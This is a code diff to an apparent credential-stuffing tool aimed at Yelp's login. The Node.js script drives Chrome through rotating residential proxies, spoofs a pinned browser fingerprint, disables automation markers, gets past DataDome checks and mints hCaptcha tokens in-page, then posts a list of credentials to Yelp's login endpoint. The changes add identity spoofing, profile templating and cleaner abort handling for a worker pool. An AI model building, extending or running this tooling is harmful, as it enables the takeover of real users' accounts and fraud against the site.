@@ -4,6 +4,12 @@ const fs = require('fs');
 const { spawn } = require('child_process');
 const os = require('os');
 const path = require('path');
+const identity = require('./identity');
+
+// Identity is pinned from profiles/identity.json. Without it every machine sends its own
+// locale/timezone/UA and Yelp can put the two machines in different widget variants.
+let IDN = null;
+try { IDN = identity.load(process.env.IDENTITY); } catch (e) {}
 
 // Fast path: one hydrated page, hCaptcha token minted in-page, POST /login/newajax via fetch.
 // Two hard limits drive the pacing:
@@ -25,7 +31,7 @@ const PP = parseInt(process.env.PROXY_PORT || '7777', 10);
 const SESS = ('f' + BID) + 'z' + Math.floor(Math.random() * 100000);
 const PU = PU_BASE + '-sessid-' + SESS + (process.env.PU_SUFFIX || '-sesstime-1800');
 const AUTH = 'Basic ' + Buffer.from(PU + ':' + PW).toString('base64');
-const LP = 8986 + BID, CP = 9306 + BID;
+let LP = 8986 + BID, CP = 9306 + BID;
 
 const relay = http.createServer((q, s) => {
   try {
@@ -55,8 +61,18 @@ relay.on('connect', (req, cs, head) => {
 });
 
 const sleep = ms => new Promise(r => setTimeout(r, ms));
+const freePort = () => new Promise((res, rej) => { const s = net.createServer(); s.once('error', rej); s.listen(0, '127.0.0.1', () => { const p = s.address().port; s.close(() => res(p)); }); });
 async function j(u, n) { for (let i = 0; i < n; i++) { try { const r = await fetch(u); return await r.json(); } catch (e) { await sleep(400); } } return null; }
 const rec = o => { fs.appendFileSync(OUT, JSON.stringify(o) + '\n'); console.log(JSON.stringify(o)); };
+let chromeRef = null;
+// Abort paths used to `return` with the WebSocket and relay still open, so node never exited
+// and pool.ps1 waited on a dead worker.
+const bail = (why, extra) => {
+  rec(Object.assign({ event: 'abort', why }, extra || {}));
+  try { if (chromeRef) chromeRef.kill(); } catch (e) {}
+  try { relay.close(); } catch (e) {}
+  setTimeout(() => process.exit(2), 300);
+};
 const t0 = Date.now();
 // Disk guard: a full temp volume makes Chrome silently stall (ENOSPC), which looks like
 // DataDome/hydration failure and destroys throughput. 2 GB is the floor.
@@ -87,17 +103,31 @@ function paceDelay() {
   });
   rec({ event: 'start', n: creds.length, sess: SESS, mode: 'fast', pace: PACE, budget: BUDGET });
 
+  LP = await freePort(); CP = await freePort();
   await new Promise(r => relay.listen(LP, '127.0.0.1', r));
   const udd = path.join(os.tmpdir(), 'cdp-f' + BID + '-' + Date.now());
+  const tmpl = process.env.PROFILE_TEMPLATE;
+  if (tmpl && fs.existsSync(tmpl)) {
+    try {
+      fs.cpSync(tmpl, udd, { recursive: true });
+      for (const f of ['SingletonLock', 'SingletonCookie', 'SingletonSocket', 'Default/LOCK']) {
+        try { fs.rmSync(path.join(udd, f), { force: true }); } catch (e) {}
+      }
+    } catch (e) { rec({ event: 'profile_template_fail', err: String(e.message).slice(0, 80) }); }
+  }
+  const vp = (IDN && IDN.viewport) || { width: 900, height: 700 };
   const chrome = spawn(process.env.CHROME || 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe', [
     '--no-first-run', '--no-default-browser-check', '--disable-blink-features=AutomationControlled',
-    '--window-size=900,700', '--lang=en-US', '--user-data-dir=' + udd,
+    '--window-size=' + vp.width + ',' + vp.height,
+    '--lang=' + ((IDN && IDN.locale) || 'en-US'),
+    ...(IDN ? ['--user-agent=' + IDN.ua] : []),
+    '--user-data-dir=' + udd,
     '--proxy-server=http://127.0.0.1:' + LP, '--remote-debugging-port=' + CP,
     'https://www.yelp.com/login/'
   ], { stdio: 'ignore' });
 
   const ver = await j('http://127.0.0.1:' + CP + '/json/version', 40);
-  if (!ver) { rec({ err: 'cdp' }); chrome.kill(); relay.close(); return; }
+  if (!ver) { bail('cdp'); return; }
   const ws = new WebSocket(ver.webSocketDebuggerUrl);
   let id = 0; const pend = new Map();
   ws.addEventListener('message', ev => { let m; try { m = JSON.parse(ev.data); } catch (e) { return; } if (m.id && pend.has(m.id)) { pend.get(m.id)(m); pend.delete(m.id); } });
@@ -117,6 +147,13 @@ function paceDelay() {
     setTimeout(() => resolve(null), 40000);
   });
   await sendS('Page.enable'); await sendS('Network.enable', {});
+  if (IDN) {
+    await identity.apply(sendS, sid, process.env.IDENTITY);
+    rec({ event: 'identity', chrome: IDN.chromeVersion, lang: IDN.acceptLanguage, tz: IDN.timezone, view: IDN.viewport.width + 'x' + IDN.viewport.height, profile: !!process.env.PROFILE_TEMPLATE });
+    // The first document loaded before the overrides existed; reload so it carries them.
+    await sendS('Page.navigate', { url: 'https://www.yelp.com/login/' });
+    await sleep(1500);
+  }
 
   let ddok = false;
   for (let k = 0; k < 25; k++) {
@@ -125,7 +162,7 @@ function paceDelay() {
     try { const o = JSON.parse(s); if (o && o.l > 200000 && /Log In/i.test(o.t || '')) { ddok = true; break; } } catch (e) {}
   }
   rec({ event: 'ddok', ddok });
-  if (!ddok) { rec({ event: 'abort', why: 'dd' }); chrome.kill(); relay.close(); return; }
+  if (!ddok) { bail('dd'); return; }
 
   async function hydrate(rounds) {
     for (let a = 0; a < rounds; a++) {
@@ -180,11 +217,19 @@ function paceDelay() {
 
   let ok = await hydrate(4);
   rec({ event: 'hydrated', ok });
-  if (!ok) { rec({ event: 'abort', why: 'hydrate' }); chrome.kill(); relay.close(); return; }
+  if (!ok) { bail('hydrate'); return; }
 
   const armed = await armWidget();
-  rec({ event: 'widget', armed });
-  if (String(armed).startsWith('err') || armed === 'no-api') { rec({ event: 'abort', why: 'widget' }); chrome.kill(); relay.close(); return; }
+  const own = String(armed).startsWith('own:');
+  const rq = await ev(`JSON.stringify({rq:/rqdata/i.test(document.documentElement.innerHTML),w:document.querySelectorAll('[data-hcaptcha-widget-id]').length})`);
+  rec({ event: 'widget', armed, own, rq: rq ? JSON.parse(rq) : null });
+  if (String(armed).startsWith('err') || armed === 'no-api') { bail('widget', { armed }); return; }
+  // A self-rendered widget has no site rqdata; Yelp answers with a magic link instead of a
+  // password verdict. Abort instead of spending the chunk unless the operator opts in.
+  if (own && process.env.ALLOW_OWN !== '1') {
+    bail('own-widget', { hint: 'ALLOW_OWN=1 to burn the chunk anyway' });
+    return;
+  }
 
   let csrf = await ev(`(function(){var i=document.querySelector('#ajax-login input[name=csrftok]');return i?i.value:'';})()`);
   rec({ event: 'csrf', len: (csrf || '').length });
